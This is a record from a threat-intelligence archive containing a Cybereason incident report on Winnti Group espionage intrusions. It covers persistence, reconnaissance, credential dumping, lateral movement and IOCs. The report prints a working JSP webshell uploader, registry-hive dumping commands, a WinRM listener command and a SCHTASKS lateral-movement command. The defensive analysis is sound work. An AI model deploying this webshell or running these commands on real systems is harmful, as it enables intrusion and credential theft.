{
    "id": "dcb350b6-7dfc-405c-9c7a-151c8e945171",
    "created_at": "2023-01-12T15:06:43.207439Z",
    "updated_at": "2025-03-27T02:16:44.784636Z",
    "deleted_at": null,
    "sha1_hash": "302ce766c8617917cbaa29874d8093ba2e4d90b9",
    "title": "2022-05-04 - Operation CuckooBees- Deep-Dive into Stealthy Winnti Techniques",
    "authors": "",
    "file_creation_date": "2022-05-28T00:28:05Z",
    "file_modification_date": "2022-05-28T00:28:05Z",
    "file_size": 1539852,
    "plain_text": "# Operation CuckooBees: Deep-Dive into Stealthy Winnti Techniques\n\n**[cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques](https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques)**\n\nWritten By\nCybereason Nocturnus\n\nMay 4, 2022 | 11 minute read\n\nIn 2021, the [Cybereason Nocturnus Incident Response Team investigated multiple intrusions targeting technology and](https://www.cybereason.com/services/incident-response)\nmanufacturing companies located in Asia, Europe and North America. Based on the findings of our investigation, it appears\nthat the goal behind these intrusions was to steal sensitive intellectual property for cyber espionage purposes.\n\n\n-----\n\n[Cybereason assesses with moderate high confidence that the threat actor behind the intrusion is the Winnti Group (also](https://attack.mitre.org/groups/G0044/)\ntracked as APT41, Blackfly and BARIUM), one of the most advanced and elusive APT groups that is known to operate on\n[behalf of Chinese state interests and whose members have been indicted by the US Department of Justice for severe](https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer)\ncomputer crimes.\n\nPart 1 of this research offers a unique glimpse into the Winnti intrusion playbook, covering the techniques that were used by\nthe group from initial compromise to data exfiltration, as observed and analyzed by the Cybereason IR Team. Part two of this\nresearch will offer a deep dive analysis of the group’s tools and unique malware, including undocumented newly discovered\nWinnti malware.\n\n## Key Findings\n\n**Multi-year Cyber Espionage Intrusions: The Cybereason IR team investigated a sophisticated and elusive cyber**\nespionage operation that has remained undetected since at least 2019 with the goal of stealing sensitive proprietary\ninformation from technology and manufacturing companies, mainly in East Asia, Western Europe, and North America.\n**Newly Discovered Malware and Multi-Stage Infection Chain:** [Part two of the research examines both known and](https://www.cybereason.com/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive)\npreviously undocumented Winnti malware which included digitally signed kernel-level rootkits as well as an elaborate\nmulti-stage infection chain which enabled the operation to remain undetected since at least 2019.\n\n**Winnti APT Group: Cybereason assesses with moderate-to-high confidence that the threat actor behind the set of**\nintrusions is the Winnti Group, a Chinese state-sponsored APT group known for its stealth, sophistication and a focus\non stealing technology.\n\n**The Winnti Playbook: This research offers a unique glimpse into the Winnti intrusion playbook, detailing the most**\nfrequently used tactics, as well as some lesser known evasive techniques that were observed during the investigation.\n\n## The Winnti Attack Lifecycle\n\nDuring 2021, Cybereason Nocturnus investigated an elaborate espionage operation targeting a number of prominent\norganizations in Asia, Europe and North America. Cybereason attributes with moderate-to-high confidence that this operation\n[was carried out by the Winnti APT group (also known as APT41, BARIUM, and Blackfly) - a Chinese state-sponsored APT](https://attack.mitre.org/groups/G0044/)\nthat has been active since at least 2010.\n\nFor years, this operation has remained under the radar, concealing a multi-layered attack scheme, with a wide and quite\ncomprehensive toolbox. The following flow chart summarizes this group’s attack life cycle in this operation:\n\n\n-----\n\n[The attackers’ initial foothold in the organization originated from multiple vulnerabilities in the organizational ERP (Enterprise](https://en.wikipedia.org/wiki/Enterprise_resource_planning)\nResource Planning) platform. From there, the attackers installed persistence in the form of a WebShell and began conducting\nreconnaissance and credential dumping, enabling them to move laterally in the network. Ultimately, it allowed the attackers to\nsteal highly sensitive information from critical servers and endpoints belonging to high-profile stakeholders.\n\nAnalysis of the data available to Cybereason suggests that the goal of the operation was focused on cyber espionage with\nthe aim of stealing proprietary information, R&D documents, source code and blueprints for various technologies.\n\nThe attackers managed to go undetected for years by using stealthy techniques combined with state-of-the-art attack and\nespionage tools which included advanced rootkits.\n\n### Initial Compromise\n\nAccording to the Cybereason IR investigation, the infection vector that was used to compromise Winnti targets consisted of\nthe exploitation of a popular ERP solution leveraging multiple vulnerabilities, some known and some that were unknown at\nthe time of the exploitation.\n\nOne of the first actions that were taken after a successful exploit was an attempt to find a specific DLL file under the VMware\nTools folder, gthread-3.6.dll. The DLL file is invoked by the intermediate dropper, and the role of the DLL is to inject the\n[payload into svchost.exe on the targeted system. This TTP has been observed before, and is known to be characteristic of](https://redmimicry.com/posts/redmimicry-winnti/)\nthe Winnti group:\n\ndir \"C:\\Program Files\\VMware\\VMware Tools\\gthread-3.6.dll\"\n\n_Command line to search for the DLL file_\n\nSearching for this DLL could suggest that the attackers had already compromised that environment in the past, or that they\nwere attempting to avoid infecting endpoints already compromised by them.\n\n### Persistence\n\n\n-----\n\nThe Cybereason Nocturnus IR team observed multiple persistence techniques that were used by Winnti over the course of\nthe intrusion. While some techniques are quite trivial and well-known, some persistence techniques are rare and advanced\nwhich only a handful of threat actors are known to have used before.\n\n**Persistence Technique #1: WebShell**\n\n[The first attempt to establish a foothold on “patient zero” was achieved by embedding a minimal JSP code for deploying a](https://en.wikipedia.org/wiki/Jakarta_Server_Pages)\nWebshell under the ERP Web Application server directory using an RCE exploit:\n\nThe attackers dropped an encoded VBScript version of the Webshell to the %UserProfile% directory off the ERP Web\nService account.\n[Once the attackers wrote the dropper to the disk, they executed the encoded VBScript file using wscript and wrote the](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wscript)\ndecoded output to a text file.\nThe final step was copying the output text file to a folder that is accessible externally via the ERP Web Service and\nchanging the extension to .jsp so it would act as a Webshell:\n\n<%\n\nif(request.getParameter(\"f\")!=null)(new\njava.io.FileOutputStream(application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());\n\n%>\n\n_A sample file uploader dropped by the Threat Actor_\n\nIt is interesting to note that the above code has been known since at least August 2006, and has been published in several\n[Chinese hacking websites, as well on GitHub repositories owned by Chinese-speaking users introducing this code as a one-](https://www.google.com/search?q=%3C%25+if%28request.getParameter%28%22f%22%29%21%3Dnull%29%28new+java.io.FileOutputStream%28application.getRealPath%28%22%5C%5C%22%29%2Brequest.getParameter%28%22f%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B+%25%3E&tbas=0&biw=1552&bih=1020&source=lnt&tbs=cdr%3A1%2Ccd_min%3A1%2F1%2F2000%2Ccd_max%3A1%2F1%2F2013&tbm=)\nliner for trojan or backdoor uploads:\n\n\n-----\n\n_JSP_\n\n_code snippet search results on Google_\n\nMultiple instances of such .jsp files were found on ERP servers. Based on the analysis of the source files found in our\nsearches, we determined the aforementioned Webshell was almost identical to a publicly known Webshell called\n[up_win32.jsp. Moreover, we found another Webshell named css.jsp, which has similarities to the code of another publicly](https://github.com/chickenlove/webshell/blob/master/jsp/hackk8/jsp_77/win32/up_win32.jsp)\n[known Webshell called cmd_win32.jsp:](https://github.com/chickenlove/webshell/blob/master/jsp/hackk8/jsp_77/win32/cmd_win32.jsp)\n\n_ERP exploitation process tree as seen in the Cybereason XDR Platform_\n\nAfter establishing a Webshell-based foothold, the attackers shifted their focus to internal reconnaissance and lateral\nmovement efforts. This is not the first time Winnti has used Webshell as a foothold tactic; in March 2021, ESET published a\n[report naming Winnti as one of the groups that targeted Exchange servers and deployed Webshell on the compromised](https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/)\nsystems.\n\n**Persistence Technique #2: WinRM over HTTP/HTTPS**\n\n\n-----\n\nThe Cybereason Nocturnus & IR Team investigation also revealed a second persistence mechanism that granted the\nattackers an additional backup entry point enabling the native Windows feature WinRM over HTTP/HTTPS on the\ncompromised servers.\n\n[WinRM is a Microsoft Windows native remote management protocol that provides remote shell access. This protocol can be](https://attack.mitre.org/techniques/T1021/006/)\nconfigured with a HTTP (Port 80) or HTTPS (Port 443) listener using the WinRM Scripting API called through a legitimate\n[Visual Basic script file called Winrm.vbs.](https://docs.microsoft.com/en-us/windows/win32/winrm/scripting-in-windows-remote-management)\n\nThe attackers executed [cscript.exe to modify the system’s WinRM configuration by setting the values of](https://lolbas-project.github.io/lolbas/Binaries/Cscript/)\n_EnableCompatibilityHttpListener and EnableCompatibilityHttpsListener to True, and by doing so, they enabled HTTP and_\nHTTPS listeners for remote shell access, preserving another way of persistence with c cscript command line to enable HTTP\nand HTTPS listeners:\n\n_cscript //nologo \"C:\\Windows\\System32\\winrm.vbs\" set winrm/config/service @{EnableCompatibilityHttpsListener=\"true\"}_\n\n_Modifying_\n\n_system WinRM configuration using cscript.exe as seen in the Cybereason XDR Platform_\n\n**Persistence Technique #3: Loading a Signed Kernel Rootkit**\n\n[The attackers leveraged a Signed Kernel Rootkit to establish an additional persistence mechanism. Detailed analysis of this](https://attack.mitre.org/techniques/T1547/006/)\nstealthy rootkit will be provided in part two of this research in the series, which offers a deep dive into the Winnti malware\narsenal.\n\n**Persistence Technique #4: Windows Service**\n\n[The attackers abused the legitimate IKEEXT and PrintNotify Windows Services to](https://attack.mitre.org/techniques/T1543/003/) [side-load Winnti DLLs and preserve](https://attack.mitre.org/techniques/T1574/002/)\npersistence. Full analysis will also be provided in part two of the research.\n\n### Reconnaissance\n\n**Initial Reconnaissance**\n\nUpon gaining access to the Windows ERP server, Winnti used the following commands:\n\n_cat /etc/hosts_\n_route print_\n\nThe nature of these commands suggest they may have been part of an automated vulnerability discovery process, as the\nERP server is a Windows server and cat /etc/hosts is a Unix command.\n\nAfter these commands were executed, the attackers began a more dedicated reconnaissance activity using built-in Windows\ncommands to gather information on the compromised server, rounding out the initial reconnaissance phase:\n\n_systeminfo_\n\n_net start_\n\n_net user_\n\n_dir c:\\_\n\n\n-----\n\n**Advanced Stages Reconnaissance**\n\n[After establishing a foothold on multiple machines in the network, Winnti began leveraging Scheduled Tasks to execute batch](https://attack.mitre.org/techniques/T1053/)\nscripts by the names “cc.bat” or “bc.bat”. The content of these batch files varied from one machine to another, each time\ncontaining different reconnaissance commands based on the attackers’ goals. Examples of this type of reconnaissance\ncommands are as follows:\n\n**Command** **Technique**\n\n_fsutil fsinfo drives_ System Drives Discovery\n\n_ipconfig_ System Network Configuration Discovery\n\n_nbtstat_ Remote System Discovery\n\n_net accounts_ Password Policy Discovery\n\n_net group_ Permission Groups Discovery\n\n_net session_ System Network Session Discovery\n\n_net share_ Network Share Discovery\n\n_net start_ System Service Discovery\n\n_net time_ System Time Discovery\n\n_net use_ System Network Connections Discovery\n\n_net user_ Account Discovery\n\n_net view_ Network Share Discovery\n\n_netstat_ System Network Connections Discovery\n\n_nslookup_ System DNS Configuration Discovery\n\n_ping_ Remote System Discovery\n\n_query user_ System Owner/User Discovery\n\n_systeminfo_ System Information Discovery\n\n_tasklist_ Process Discovery\n\n_tracert_ Remote System Route Discovery\n\n_whoami_ Logged On User Discovery\n\n\n-----\n\nWhen the attackers gained access to a desired domain environment, they started gathering information about the domain\nusing built-in Windows commands again. In this phase, Cybereason Nocturnus IR team observed additional queries for users\n[in administrative groups along with execution of Dsquery and](https://attack.mitre.org/software/S0105/) [Dsget commands. The attackers then compressed using](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc755162(v=ws.11)https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc755162(v=ws.11))\n[makecab.exe the collected information and exfiltrated it to their servers.](https://attack.mitre.org/techniques/T1560/001/)\n\n### Credential Dumping\n\nDuring the attack, Cybereason Nocturnus observed two methods that were utilized for credential dumping: the first one used\nthe known [reg save command, and the second was an unknown tool, named MFSDLL.exe.](https://attack.mitre.org/techniques/T1003/002/)\n\nUsing the reg save command, the attackers attempted to dump the SYSTEM, SAM and SECURITY registry hives as follows:\n\n_reg save HKLM\\SYSTEM system.hiv_\n\n_reg save HKLM\\SAM sam.hiv_\n\n_reg save HKLM\\SECURITY security.hiv_\n\nDumping these hives ultimately enabled the attackers to crack password hashes locally.\n\nThe second tool used by the attackers to dump credentials was a previously undocumented executable named MFSDLL.exe.\nAt the time of the investigation, Cybereason was not able to recover a copy of it to examine its content. Nevertheless, the\nCybereason XDR solution managed to detect how this file was used as well as what it loaded. The attackers used this tool in\nthe following manner:\n\n_MFSDLL.exe <12 characters string> <file> <parameter> (for example - MSFDLL.exe_ _<12 characters string> 1.log dump)_\n\nThe variations it was found to be used were:\n\n_MFSDLL.exe <12 characters string> <file_name>.log domain_\n\n_MFSDLL.exe <12 characters string> <file_name>.log dump_\n\n_MFSDLL.exe <12 characters string> <file_name>.log password_\n\n_MFSDLL.exe <12 characters string> <file_name>.log sam_\n\n_MFSDLL.exe <12 characters string> <file_name>.log minidump_\n\nThe Nocturnus IR team also observed the loading of a DLL file called mktzx64.dll along with the sam command execution.\n[The name of this DLL was mentioned in a report by ESET detailing an espionage campaign in Asia linked to China, and it](https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/)\n[suggests the use of Mimikatz, a popular credential dumping tool.](https://attack.mitre.org/software/S0002/)\n\nThis manner of execution resembles ACEHASH, a credential theft and password dumping utility, which was leveraged by the\n[Winnti group in the past, using commands such as “c64.exe f64.data \"9839D7F1A0 -m”:](https://www.mandiant.com/resources/game-over-detecting-and-stopping-an-apt41-operation)\n\n\n-----\n\n_MFSDLL.exe executions as seen in the Cybereason XDR Platform_\n\n### Lateral Movement\n\n[For lateral movement, the attackers used the Windows-native Schtasks command to create remote scheduled tasks, and to](https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks)\nexecute malicious code through the aforementioned batch files:\n\n_SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST_\n_<Time> /RU SYSTEM_\n\n_The scheduled task command line used for lateral movement_\n\nThe scheduled tasks the attackers have created were created with the name test, using compromised Domain Administrator\ncredentials. The batch file the scheduled task executed was executed from a temp folder using the local SYSTEM account.\n\nThe attackers used these scheduled tasks to execute commands on dozens of compromised machines throughout this stage\nof the attack. The batch files’ content have changed from one phase of the attack to another, which were initially used to\nexecute reconnaissance commands and later on were used in order to distribute malicious binaries.\n\nAmong the compromised machines, the attackers were able to expand their control to the Domain Controllers using the same\nmethod. Once the Domain Admin credentials were obtained, the attackers were able to move laterally and infect a large\nnumber of hosts using the stolen credentials.\n\n### Data Collection and Exfiltration\n\n[To collect data efficiently, the attackers have utilized a renamed Chinese-language version of WinRAR to create password-](https://www.win-rar.com/start.html?&L=0)\nprotected archives containing the stolen data. The WinRAR executable is a 32-bit command-line version of the legitimate\nWinRAR application. The executable was renamed to rundll32.exe, a legitimate Windows program, in order to disguise it and\nsilently blend it in with other Windows system files:\n\n\n-----\n\n_The WinRAR renamed version_\n\n## Conclusions\n\nIn the first part of this Winnti research, we reported the discovery of multiple sets of intrusions that went undetected for years.\nThese intrusions targeted technology and manufacturing companies in multiple regions of the world to steal sensitive\ninformation for cyber espionage purposes.\n\nBased on our analysis and the information available, we assess with moderate-to-high confidence that the attacks described\nin this report were carried out by the notorious Winnti APT Group, a highly sophisticated APT group operating on behalf of\nChinese state interests that has been active since at least 2010. The group has been known over the years for its focus on\nintellectual property theft.\n\nIn this part of the research, we offered readers a unique glimpse into the attacker’s playbook, forensically tracing the attack\n[steps from initial compromise all the way through data exfiltration. In part two of this research, we will take a deep dive into](https://www.cybereason.com/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive)\nthe Winnti malware arsenal, analyzing the different implants and unique infection chains.\n\n## Acknowledgments\n\nThis research has not been possible without the tireless effort, analysis, attention to details and contribution of the\nCybereason Incident Response team. Special thanks and appreciation goes to Matt Hart, Yusuke Shimizu, Niamh O’Connor,\nJim Hung, and Omer Yampel.\n\n## Indicators of Compromise\n\n_LOOKING FOR THE IOCs? CLICK ON THE CHATBOT DISPLAYED IN LOWER-RIGHT OF YOUR SCREEN FOR ACCESS._\n_Due to the sensitive nature of the attack, not all IOCs observed by Cybereason can be shared in our public report. Please_\n_contact us for more information._\n\n## MITRE ATT&CK BREAKDOWN\n\n\n**Reconnaissance** **Initial**\n**Access**\n\n\n**Execution** **Persistence** **Privilege**\n**Escalation**\n\n\n**Defense**\n**Evasion**\n\n\n-----\n\nGather Victim\nIdentity\nInformation:\nCredentials\n\nGather Victim\n[Network](https://attack.mitre.org/techniques/T1590/)\nInformation\n\n**Credential**\n**Access**\n\nOS\n[Credential](https://attack.mitre.org/techniques/T1003/)\nDumping\n\n\nSystem Network\n[Configuration](https://attack.mitre.org/techniques/T1016/)\nDiscovery\n\nRemote System\nDiscovery\n\nPassword Policy\nDiscovery\n\nPermission Groups\nDiscovery\n\nNetwork Share\nDiscovery\n\n\nExploit\nPublicFacing\nApplication\n\nSupply\nChain\nCompromise\n\n\n[Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/) Server Software\nComponent: Web Shell\n\n\nInter-process\ncommunication\n\nExploitation for Client\nExecution\n\nCommand and\nScripting Interpreter:\nWindows Command\nShell\n\nCommand and\n[Scripting Interpreter:](https://attack.mitre.org/techniques/T1059/005/)\nVisual Basic\n\n\nHijack Execution\n[Flow: DLL Side-](https://attack.mitre.org/techniques/T1574/002/)\nLoading\n\n[Rootkit](https://attack.mitre.org/techniques/T1014/)\n\nMasquerading:\nMatch Legitimate\nName or\nLocation\n\nProcess\nInjection:\nDynamic-link\nLibrary Injection\n\nReflective Code\nLoading\n\nSigned Binary\n[Proxy Execution:](https://attack.mitre.org/techniques/T1218/011/)\nRundll32\n\nValid Accounts:\nDomain Accounts\n\nValid Accounts:\nLocal Accounts\n\n\nHijack Execution Flow:\nDLL Side-Loading\n\nProcess Injection:\n[Dynamic-link Library](https://attack.mitre.org/techniques/T1055/001/)\nInjection\n\nScheduled Task/Job:\nScheduled Task\n\nValid Accounts:\nDomain Accounts\n\n\nCreate or Modify\n[System Process:](https://attack.mitre.org/techniques/T1543/003/)\nWindows Service\n\nProcess Injection:\n[Dynamic-link](https://attack.mitre.org/techniques/T1055/001/)\nLibrary Injection\n\nScheduled\n[Task/Job:](https://attack.mitre.org/techniques/T1053/005/)\nScheduled Task\n\nValid Accounts:\nDomain Accounts\n\nValid Accounts:\nLocal Accounts\n\n\n[Native API](https://attack.mitre.org/techniques/T1106/) Valid Accounts: Local\nAccounts\n\nBoot or Logon\nAutostart Execution:\nKernel Modules and\nExtensions\n\n\n**Discovery** **Lateral movement** **Collection** **Exfiltration** **Command and**\n**Control**\n\n\nExploitation of Remote\nServices\n\nRemote Services:\n[Remote Desktop](https://attack.mitre.org/techniques/T1021/001/)\nProtocol\n\n\nArchive Collected\n[Data: Archive via](https://attack.mitre.org/techniques/T1560/001/)\nUtility\n\n\nAutomated\nExfiltration\n\n\nApplication Layer\n[Protocol: Web](https://attack.mitre.org/techniques/T1071/001/)\nProtocols\n\n\n[Automated Collection](https://attack.mitre.org/techniques/T1119/) [Proxy](https://attack.mitre.org/techniques/T1090/)\n\n\n-----\n\nSystem Service\nDiscovery\n\nSystem Time\nDiscovery\n\nSystem Network\n[Connections](https://attack.mitre.org/techniques/T1049/)\nDiscovery\n\n[Account Discovery](https://attack.mitre.org/techniques/T1087/)\n\nSystem Owner/User\nDiscovery\n\nSystem Information\nDiscovery\n\n[Process Discovery](https://attack.mitre.org/techniques/T1057/)\n\n## About the Researchers:\n\n**Chen Erlich**\n\nChen has almost a decade of experience in Threat Intelligence & Research, Incident Response and Threat Hunting. Before\njoining Cybereason, Chen spent three years dissecting APTs, investigating underground cybercriminal groups and\ndiscovering security vulnerabilities in known vendors. Previously, he served as a Security Researcher in the IDF.\n\nFusao Tanida\n\nFusao spent over 10 years in the security industry. Before joining, he worked as a mobile malware researcher and a\ndeveloper at the security vendor and then worked at the global mobile phone manufacturer for the development of AntiVirus,\nVPN client on their Android mobile phone.\n\nFusao joined Cybereason in 2019 and was previously the Senior Security Analyst at the Advanced Services Team in\nCybereason Japan where delivered various security professional services, Incident Response, consultation and triage\nmalware activity alerts in SOC.\n\n\n-----\n\nOfir Ozer\n\nOfir is a Incident Response Engineer at Cybereason who has a keen interest in Windows Internals, reverse engineering,\nmemory analysis and network anomalies. He has years of experience in Cyber Security, focusing on Malware Research,\nIncident Response and Threat Hunting. Ofir started his career as a Security Researcher in the IDF and then became a\nmalware researcher focusing on Banking Trojans.\n\nAkihiro Tomita\n\nAkihiro is the Senior Manager of Global Security Practice, leading Incident Response team in the APAC region and Japan.\nAkihiro has led a substantial number of large-scale Incident Response, Digital Forensics and Compromise Assessment\nengagements during recent years. Akihiro was also a former Team lead of Advanced Security Services team responsible for\nmanaging, developing, delivering a variety of professional services including Proactive threat hunting, Security Posture\nAssessment, Advanced security training and consulting services at Cybereason.\n\nNiv Yona\n\nNiv, IR Practice Director, leads Cybereason's incident response practice in the EMEA region. Niv began his career a decade\nago in the Israeli Air Force as a team leader in the security operations center, where he specialized in incident response,\nforensics, and malware analysis. In former roles at Cybereason, he focused on threat research that directly enhances product\ndetections and the Cybereason threat hunting playbook, as well as the development of new strategic services and offerings.\n\nDaniel Frank\n\nWith a decade in malware research, Daniel uses his expertise with malware analysis and reverse engineering to understand\nAPT activity and commodity cybercrime attackers. Daniel has previously shared research at RSA Conference, the Microsoft\nDigital Crimes Consortium, and Rootcon.\n\n\n-----\n\nASSAF DAHAN, HEAD OF THREAT RESEARCH\n\nAssaf has over 15 years in the InfoSec industry. He started his career in the Israeli Military 8200 Cybersecurity unit where he\ndeveloped extensive experience in offensive security. Later in his career he led Red Teams, developed penetration testing\nmethodologies, and specialized in malware analysis and reverse engineering.\n\n### Operation CuckooBees Indicators of Compromise (IOCs)\n\n**Hashes**\n\nBB93AE0FEE817FE56C31BDC997F3F7D57A48C187 - STASHLOG\n4D1B8791D0715FE316B43FC95BDC335CB31A82CA - STASHLOG\n2D336978AF261E07B1ECFAF65DC903B239E287A4 - STASHLOG\nF2D04FE529E2D8DAB96242305255CFB84CE81E9C - STASHLOG\nF8D46895E738254238473D650D99BDC92C34EE44 - SPARKLOG\n9267FE0BB6D367FC9186E89EA65B13BAA7418D87 - PRIVATELOG\nA009A0F5A385683AEA74299CBE6D5429C609F2D2 - PRIVATELOG\n1316F715D228AE6CC1FBA913C6CC309861F82E14 - PRIVATELOG\n1275894D8231FE25DB56598DDCF869F88DF5AD8D - WINNKIT\n9139C89B2B625E2CEEE2CBF72AEF6C5104707A26 - WINNKIT\n082DBCA2C3CA5C5410DE9951A5C681F0C42235C8 - WINNKIT\n\n**File Names & Paths**\n\nC:\\Windows\\temp\\bc.bat\nC:\\Windows\\AppPatch\\Custom\\Custom64\\cc.bat\nC:\\Windows\\temp\\cc.log\nC:\\Windows\\AppPatch\\Custom\\Custom64\\log.dat\nC:\\Windows\\Branding\\Basebrd\\x64.tlb\nC:\\Windows\\Branding\\Basebrd\\language.dll\nC:\\Windows\\System32\\mscuplt.dll\nC:\\Windows\\System32\\rpcutl.dll\nC:\\Windows\\System32\\dot3utl.dll\nC:\\Windows\\System32\\iumatl.dll\nC:\\Windows\\System32\\Nlsutl.dll\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\dbghelp.dll\nC:\\Windows\\System32\\drivers\\bqDsp.sys\nC:\\Windows\\apppatch\\en-us\\MFSDLL.exe\nC:\\Windows\\System32\\spool\\drivers\\x64\\3\\prntvpt.dll\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\wlbsctrl.dll\nC:\\Windows\\assembly\\gac_msil\\dfsvc\\foserv.exe\nC:\\Windows\\assembly\\temp\\foserv.exe\nC:\\Windows\\apppatch\\custom\\custom64\\shiver.exe\nC:\\Windows\\apppatch\\custom\\custom64\\spark.exe\nmktzx64.dll\n\n**Winnti Malware Modules Names**\n\nCmp2.o\nFmg2.o\nSrv2 o\n\n\n-----\n\nSck2.o\nPrc2.o\nTrs2.o\nCme2.o\n\n**Events**\n\n\\BaseNamedObjects\\{75F09225-CD50-460B-BF90-5743B8404D73}\n\\BaseNamedObjects\\{7D0DF5FC-3991-4047-921F-32308B1A0459}\n\\BaseNamedObjects\\{B73AB0F4-A1D0-4406-9066-41E00BA78E9F}\nGlobal\\APCI#<GUID>\nGlobal\\HVID_<GUID>\n\n**Named Pipes**\n\nPipe2PortCtrl\n\n**Scheduled Task Name**\n\ntest\n\nAbout the Author\n\n**Cybereason Nocturnus**\n\nThe Cybereason Nocturnus Team has brought the world’s brightest minds from the military, government intelligence, and\nenterprise security to uncover emerging threats across the globe. They specialize in analyzing new attack methodologies,\nreverse-engineering malware, and exposing unknown system vulnerabilities. The Cybereason Nocturnus Team was the first\nto release a vaccination for the 2017 NotPetya and Bad Rabbit cyberattacks.\n\n[All Posts by Cybereason Nocturnus](https://www.cybereason.com/blog/authors/cybereason-nocturnus)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-04 - Operation CuckooBees- Deep-Dive into Stealthy Winnti Techniques.pdf"
    ],
    "report_names": [
        "2022-05-04 - Operation CuckooBees- Deep-Dive into Stealthy Winnti Techniques.pdf"
    ],
    "threat_actors": [
        {
            "id": "5bbced13-72f7-40dc-8c41-dcce75bf885e",
            "created_at": "2022-10-25T15:50:23.695735Z",
            "updated_at": "2025-03-27T02:00:55.525839Z",
            "deleted_at": null,
            "main_name": "Winnti Group",
            "aliases": [
                "Winnti Group"
            ],
            "source_name": "MITRE:Winnti Group",
            "tools": [
                "PipeMon",
                "Winnti for Windows",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "49822165-5541-423d-8808-1c0a9448d588",
            "created_at": "2022-10-25T16:07:23.384093Z",
            "updated_at": "2025-03-27T02:02:09.772829Z",
            "deleted_at": null,
            "main_name": "Barium",
            "aliases": [
                "Brass Typhoon",
                "Pigfish"
            ],
            "source_name": "ETDA:Barium",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "Barlaiy",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Destroy RAT",
                "DestroyRAT",
                "Kaba",
                "Korplug",
                "POISONPLUG",
                "PlugX",
                "RbDoor",
                "RedDelta",
                "RibDoor",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Winnti",
                "Xamtrav",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "945a572f-ebe3-4e2f-a288-512fe751cfa8",
            "created_at": "2022-10-25T16:07:24.413971Z",
            "updated_at": "2025-03-27T02:02:10.212853Z",
            "deleted_at": null,
            "main_name": "Winnti Group",
            "aliases": [
                "Wicked Panda",
                "Winnti Group"
            ],
            "source_name": "ETDA:Winnti Group",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "FunnySwitch",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c7d9878a-e691-4c6f-81ae-84fb115a1345",
            "created_at": "2022-10-25T16:07:23.359506Z",
            "updated_at": "2025-03-27T02:02:09.752427Z",
            "deleted_at": null,
            "main_name": "APT 41",
            "aliases": [
                "BrazenBamboo",
                "Bronze Atlas",
                "Double Dragon",
                "Earth Baku",
                "Grayfly",
                "Operation ColunmTK",
                "Operation CuckooBees",
                "Operation ShadowHammer",
                "Red Kelpie",
                "SparklingGoblin",
                "TA415",
                "TG-2633"
            ],
            "source_name": "ETDA:APT 41",
            "tools": [
                "9002 RAT",
                "ADORE.XSEC",
                "ASPXSpy",
                "ASPXTool",
                "AceHash",
                "Agent.dhwf",
                "Agentemis",
                "AndroidControl",
                "AngryRebel",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BLUEBEAM",
                "Barlaiy",
                "BlackCoffee",
                "Bladabindi",
                "BleDoor",
                "CCleaner Backdoor",
                "CHINACHOPPER",
                "COLDJAVA",
                "China Chopper",
                "ChyNode",
                "Cobalt Strike",
                "CobaltStrike",
                "Crackshot",
                "CrossWalk",
                "CurveLast",
                "CurveLoad",
                "DAYJOB",
                "DBoxAgent",
                "DEADEYE",
                "DEADEYE.APPEND",
                "DEADEYE.EMBED",
                "DEPLOYLOG",
                "DIRTCLEANER",
                "DUSTTRAP",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "DodgeBox",
                "DragonEgg",
